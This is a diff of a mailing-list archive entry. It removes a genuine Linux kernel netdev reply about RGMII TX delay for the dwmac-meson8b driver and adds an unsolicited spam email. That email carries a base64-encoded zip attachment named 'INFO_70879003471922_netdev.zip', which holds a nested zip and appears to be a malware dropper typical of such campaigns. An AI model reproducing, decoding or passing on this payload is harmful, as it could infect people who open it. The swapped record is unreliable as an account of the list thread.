@@ -1,55 +1,53 @@
-From: David Laight <David.Laight@ACULAB.COM>
-Subject: RE: [PATCH v2 0/7] stmmac: dwmac-meson8b: configurable RGMII TX delay
-Date: Fri, 25 Nov 2016 13:41:02 +0000
-Message-ID: <063D6719AE5E284EB5DD2968C1650D6DB0228643@AcuExch.aculab.com>
-References: <20161124143417.10178-1-martin.blumenstingl@googlemail.com>
- <20161125130156.17879-1-martin.blumenstingl@googlemail.com>
+From: <chacoma4018@windstream.net>
+Subject: 47858 netdev
+Date: Fri, 25 Nov 2016 13:57:45 -0000
+Message-ID: <148008226504.6552.4115504923646821562@smsarena.pl>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: 7bit
-Cc: "f.fainelli@gmail.com" <f.fainelli@gmail.com>,
- "alexandre.torgue@st.com" <alexandre.torgue@st.com>,
- "catalin.marinas@arm.com" <catalin.marinas@arm.com>,
- "will.deacon@arm.com" <will.deacon@arm.com>,
- "carlo@caione.org" <carlo@caione.org>,
- "peppe.cavallaro@st.com" <peppe.cavallaro@st.com>,
- "linux-arm-kernel@lists.infradead.org" <linux-arm-kernel@lists.infradead.org>
-To: 'Martin Blumenstingl' <martin.blumenstingl@googlemail.com>,
- "linux-amlogic@lists.infradead.org" <linux-amlogic@lists.infradead.org>,
- "devicetree@vger.kernel.org" <devicetree@vger.kernel.org>,
- "netdev@vger.kernel.org" <netdev@vger.kernel.org>, "davem@davemloft.net"
- <davem@davemloft.net>, "khilman@baylibre.com" <khilman@baylibre.com>,
- "mark.rutland@arm.com" <mark.rutland@arm.com>, "robh+dt@kernel.org"
- <robh+dt@kernel.org>
-Return-path: <linux-arm-kernel-bounces+linux-arm-kernel=m.gmane.org@lists.infradead.org>
-In-Reply-To: <20161125130156.17879-1-martin.blumenstingl@googlemail.com>
-Content-Language: en-US
-List-Unsubscribe: <http://lists.infradead.org/mailman/options/linux-arm-kernel>,
- <mailto:linux-arm-kernel-request@lists.infradead.org?subject=unsubscribe>
-List-Archive: <http://lists.infradead.org/pipermail/linux-arm-kernel/>
-List-Post: <mailto:linux-arm-kernel@lists.infradead.org>
-List-Help: <mailto:linux-arm-kernel-request@lists.infradead.org?subject=help>
-List-Subscribe: <http://lists.infradead.org/mailman/listinfo/linux-arm-kernel>,
- <mailto:linux-arm-kernel-request@lists.infradead.org?subject=subscribe>
-Sender: "linux-arm-kernel" <linux-arm-kernel-bounces@lists.infradead.org>
-Errors-To: linux-arm-kernel-bounces+linux-arm-kernel=m.gmane.org@lists.infradead.org
-List-Id: netdev.vger.kernel.org
+Content-Type: application/zip; name="INFO_70879003471922_netdev.zip"
+Content-Transfer-Encoding: base64
+To: <netdev@vger.kernel.org>
+Return-path: <netdev-owner@vger.kernel.org>
+Received: from api.smsarena.pl ([195.140.188.232]:47281 "HELO smsarena.pl"
+        rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1754284AbcKYN5s (ORCPT <rfc822;netdev@vger.kernel.org>);
+        Fri, 25 Nov 2016 08:57:48 -0500
+Content-Disposition: attachment
+Sender: netdev-owner@vger.kernel.org
+List-ID: <netdev.vger.kernel.org>
 
-From: Martin Blumenstingl
-> Sent: 25 November 2016 13:02
-> Currently the dwmac-meson8b stmmac glue driver uses a hardcoded 1/4
-> cycle TX clock delay. This seems to work fine for many boards (for
-> example Odroid-C2 or Amlogic's reference boards) but there are some
-> others where TX traffic is simply broken.
-> There are probably multiple reasons why it's working on some boards
-> while it's broken on others:
-> - some of Amlogic's reference boards are using a Micrel PHY
-> - hardware circuit design
-> - maybe more...
-...
-
-Interesting thought.
-Can you test phy loopback with different delays?
-It might be then possible to default to 'auto'.
-
-	David
+UEsDBBQAAgAIAOGdeUnyUZSkEAcAABUHAAAVABwATUVTU0FHRV8yNzM2MF9aSVAuemlwVVQJAAPV
+QDhY1UA4WHV4CwABBAAAAAAEAAAAAHXVZzgbihoH8BBipWoVoRRRUutQqlZa1KhxCDGOnVqpUaMk
+RYmmagRXVKkVq3KR4tirRhurUWqPolZrNlFbqV5Oe863e5/7Ps//HR/ezz+EGZBFAMAMYAcs5YWb
+4JKkWt1AAMA1MQCAB3AR8LshEqlnbOh29bqqurKSb4itDQcAOKGr8cevYMK4AEwsgJ/1d6t0cAoh
+qQvgUqJZV7w2Jevmm1vqd5rzyJSx+I8l9GzPuO96jwCKEvhUlGHpWbs+X2aDmGjQj9SdMExKyuCK
+9kJT+K0rPHQSn1EWbclx+UZ3lge9s7O6UUnzECJ19KEkNThRUbB4dM65YFZ2zfhCoSC77gBFZ3Nm
+GOdbiXOcOxvCRHfV7Cwee7JF7lcc1Jj+1uf7VKgjCfGFK6c4wccehua/pyqOzMLzBIxrjy5+zfyo
+LnBtFacbRGGwN64ZiRlJLAfj71bo99YVuNwRLy4EiObBE0o9t7Q7EDHHHXFMxw6aXKhXA5Z9fpxw
+zshT55UVeUP+PQKWd4Eqp/96XV+BAVvKJAPS6eSwyw5HPLQ34iO6ZSilcK3WNolbkMQ+s5VFuKc9
+18IzGZqf7oH+8TGpy+lf2Nk4Bnzdw1pghr36aKxbiqHqyiLdb5CMs+WQ1iTlVN9GPLXXscWmf3bg
+J1F14otqG5qOxyHL9Z+y9BlPZSZ27oNem7epEvEFBBAUQyG+6TbDy4q41m/+B0NHEtRKEBBKLE73
+O4eCPPZcmgEDWaSMObiukHkQgNeD7ImoZUDQtMWLJ+AjKemiq+1Du0vf1QikF3GyRxn3D41NV7OM
+O25LG0yCcsNbFMorBKz6PGrHMgYvdX95uDYym+Qp25l8/YuJ/TLf+xqimXVfwNB+rh2ERDTXS8Sq
+cBxKIZWkG9uyWc3FiaK8VAM0ph+Qey5gnpt2nSZ5c4z+vMhr2v82mM5j965fyPqGd0w4zDCdww0/
+78slpxGr6cm8ltAxStneMADDrGJ/PCaXJGbC8vhf/mgvkniH+rf2rulyEJYjYaqQBzgHvOzcvGLN
+l5D6ghEbvIfNLnDhHhXrrFU56O0rkdKAyY1KGBkWgSlw2aMcJE+CzQKk5ojXw4UgHcOh4vCG+kTK
+W+LQKh/YLgusYXzSYWl9bKNfVXSBVrLlRFwrGxFl8z4u1aQkGeSnwi1dQ9lrFY408CY92aFXQZfR
+Bp0kUe0ZyDN+9H5EHYB/ROCeDCiADsaox7gmPe6HdomS8Dc1ihu+gnc7IXuR6HEMCGQ9vFpT6j+Y
+6oIen/U+hGdZjySS83OzJWF3bJqol6phaIP9g5ZCHryz/ssQIwSKhCLIbSrvD68nj0xCQuNvFKRx
+2rrmqsxRvSs+XbyQZt5EFFmch9yzGYuKJFa/W81q1hYDKpMRAToDMXYlYJYeSJUtGiw9qCxSUsY6
+vdWyMH+V2WcNlaEFPQ305UPpzfYoy/BanH/ofZ5ges7C8sbDO4kTyuePvn5EEAbfbOeltGoWb/o3
+whVNzHqNdmmaZPvBMCENI75crS7hl8ywjruIVmZx9/fy0JqF23gXamBBu9j+dI1f5umD/dE5JOy3
+9Mg4SZ1M4Stdd6MIjI23yD84H472pVH9eQXl6eqQ/sqoQ1Ry+yKL2hOVPi/FV7XNf+Lr/R6ERCly
+7Q50LFg5QFffTgZvDWCuxV1hmwyc3OOnL0AvpQ+7p3dNGVuqDezU6/fs1eUu1Ddv2iuGiD5C6lQq
+1c4JXktkjPgI0SzyRX9Ak6I6aEdkF5SlDqfefdx+QRw4zlpXL0uux/N1+Ldp3Prhg8CppNEWr9CA
+5xI0QVyUbrgulomhVbnV9nmJKlZUtuxrNNGfwgk9ie8cCgW/AoY3dp4yFdYJ+8oUDojJ5dB6qtKO
+g082P8fsRGs4Rec+3yFeOn3lKHAwken1e6iHzzn4eIP5Wy9+11tufjlVC/zIb93x9xtd501nhUtC
+Jqeh48wfNgmewbxV3Nh495KIENKG2enTm888RC42RNqcbMgPF+ZwVH7w6BXMuBkdpVVJtaBHzFAj
+XBSrhEzGfJrY84fK5MnEdUmj3ZXeUomwoHd1bx+taBFl3Xe3lpKTXUiVaxa+1Yva0Cv+kRYZHzQM
+eFnTdxGvy52n7lbgQFpOUxNS5cXorbO2CGWo5clGuO897qqNjCxvP6HJuhhigyD9xmxy13BtOfF8
+7OTO9p3SjuSVWEzjdL3adh+tycp1pgs146N48O05GdYgblpJfZ9pgxPUeUFdEndUdfw83iSo+x5A
+XGML/PqkELcf9GV5O8sOFxVgyxlpo0Zjq2ibgHtv1LOd3Pqz/EkRdsTL0t6tDk7ZBdYGnoWUXvCp
+dTdVfrm3Zgzklj8ubRdOerZ3xoQwY2IWB/4/qoR/CQRg+hky/tf2v3Cx/gPXf6GFMGMF/fPJBLD7
+OSl/X38BUEsBAh4DFAACAAgA4Z15SfJRlKQQBwAAFQcAABUAGAAAAAAAAAAAAKSBAAAAAE1FU1NB
+R0VfMjczNjBfWklQLnppcFVUBQAD1UA4WHV4CwABBAAAAAAEAAAAAFBLBQYAAAAAAQABAFsAAABf
+BwAAAAA=
